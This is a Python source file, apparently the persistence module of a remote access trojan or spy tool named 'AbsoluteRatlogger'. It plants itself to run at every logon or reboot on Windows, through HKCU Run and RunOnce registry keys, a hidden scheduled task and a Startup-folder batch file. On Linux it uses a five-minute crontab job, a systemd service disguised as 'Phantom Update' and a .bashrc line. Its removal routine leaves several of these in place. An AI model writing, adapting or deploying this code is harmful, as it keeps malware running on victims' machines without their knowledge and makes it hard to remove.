#!/usr/bin/env python3
"""Persistence module — install persistence on Windows and Linux."""
import os
import sys
import platform
import subprocess

def install(method="auto"):
    """Install persistence using the specified method."""
    system = platform.system()
    if system == "Windows":
        return _install_windows(method)
    elif system == "Linux":
        return _install_linux(method)
    return f"error: unsupported platform {system}".encode()

def _install_windows(method):
    """Windows persistence methods."""
    try:
        import winreg
    except ImportError:
        return b"error: winreg not available"

    exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    script = "" if getattr(sys, 'frozen', False) else f' "{os.path.abspath(__file__)}"'

    if method in ("auto", "run_key"):
        try:
            with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, "AbsoluteRatloggerUpdate", 0, winreg.REG_SZ, exe + script)
            return b"ok: Run key installed (HKCU)"
        except Exception as e:
            return f"error: {e}".encode()

    elif method == "run_once":
        try:
            with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
                0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, "AbsoluteRatloggerUpdate", 0, winreg.REG_SZ, exe + script)
            return b"ok: RunOnce key installed"
        except Exception as e:
            return f"error: {e}".encode()

    elif method == "sched_task":
        try:
            subprocess.run(
                ["schtasks.exe", "/Create", "/F", "/SC", "ONLOGON",
                 "/TN", "AbsoluteRatloggerUpdate", "/TR", f'"{exe}"{script}'],
                capture_output=True, creationflags=0x08000000)
            return b"ok: Scheduled task installed"
        except Exception as e:
            return f"error: {e}".encode()

    elif method == "startup_folder":
        try:
            startup = os.path.join(os.environ.get("APPDATA", ""),
                "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            bat_path = os.path.join(startup, "AbsoluteRatloggerUpdate.bat")
            with open(bat_path, "w") as f:
                f.write(f'@echo off\n{exe}{script}\n')
            return b"ok: Startup folder batch installed"
        except Exception as e:
            return f"error: {e}".encode()

    return b"error: unknown method"

def _install_linux(method):
    """Linux persistence methods."""
    script_path = os.path.abspath(__file__)
    python = sys.executable

    if method in ("auto", "crontab"):
        try:
            entry = f"*/5 * * * * {python} {script_path}\n"
            try:
                existing = subprocess.check_output(["crontab", "-l"],
                    text=True, stderr=subprocess.DEVNULL)
            except:
                existing = ""
            new_crontab = existing + entry
            subprocess.run(["crontab", "-"], input=new_crontab, text=True)
            return b"ok: Crontab installed"
        except Exception as e:
            return f"error: {e}".encode()

    elif method == "systemd":
        service = f"""[Unit]
Description=Phantom Update
After=network.target

[Service]
Type=simple
ExecStart={python} {script_path}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
"""
        service_path = "/etc/systemd/system/phantom-update.service"
        try:
            with open(service_path, "w") as f:
                f.write(service)
            subprocess.run(["systemctl", "daemon-reload"])
            subprocess.run(["systemctl", "enable", "phantom-update"])
            subprocess.run(["systemctl", "start", "phantom-update"])
            return b"ok: Systemd service installed"
        except PermissionError:
            return b"error: needs root"
        except Exception as e:
            return f"error: {e}".encode()

    elif method == "bashrc":
        try:
            rc = os.path.expanduser("~/.bashrc")
            entry = f"\n# Phantom\n{python} {script_path} &\n"
            with open(rc, "a") as f:
                f.write(entry)
            return b"ok: bashrc installed"
        except Exception as e:
            return f"error: {e}".encode()

    return b"error: unknown method"

def remove():
    """Remove persistence."""
    system = platform.system()
    if system == "Windows":
        try:
            import winreg
            for key_path in [r"Software\Microsoft\Windows\CurrentVersion\Run",
                           r"Software\Microsoft\Windows\CurrentVersion\RunOnce"]:
                try:
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path,
                        0, winreg.KEY_SET_VALUE) as k:
                        winreg.DeleteValue(k, "AbsoluteRatloggerUpdate")
                except: pass
            subprocess.run(["schtasks.exe", "/Delete", "/F", "/TN", "AbsoluteRatloggerUpdate"],
                capture_output=True, creationflags=0x08000000)
            return b"ok: persistence removed"
        except Exception as e:
            return f"error: {e}".encode()
    elif system == "Linux":
        try:
            existing = subprocess.check_output(["crontab", "-l"],
                text=True, stderr=subprocess.DEVNULL)
            filtered = "\n".join(
                line for line in existing.split("\n")
                if "AbsoluteRatloggerUpdate" not in line and "absolutespy" not in line.lower()
            ) + "\n"
            subprocess.run(["crontab", "-"], input=filtered, text=True)
            return b"ok: crontab entry removed"
        except Exception as e:
            return f"error: {e}".encode()
    return b"error: unsupported platform"
